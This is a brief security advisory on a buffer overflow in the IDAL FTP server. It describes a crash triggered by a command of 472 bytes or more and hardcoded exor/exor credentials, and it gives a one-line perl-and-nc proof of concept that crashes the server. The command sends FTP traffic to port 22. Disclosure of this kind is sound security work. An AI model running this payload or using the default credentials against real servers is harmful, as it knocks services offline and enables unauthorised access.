Vulnerability summary
---------------------
The IDAL FTP server is vulnerable to a buffer overflow where a large string is sent by an authenticated attacker that causes a buffer overflow. This overflow is handled, but terminates the process.


Technical details
-----------------
An authenticated attacker can send a FTP command string of 472 bytes or more to overflow a buffer causing an exception that terminates the server. An unauthenticated attacker can take advantage of the hardcoded or default credential pair exor/exor to become an authenticated attacker.


Proof of concept
----------------
```
perl -e 'print "USER exor\r\nPASS exor\r\n" . "A" x 472 . "\r\n";' | nc targetip 22
```
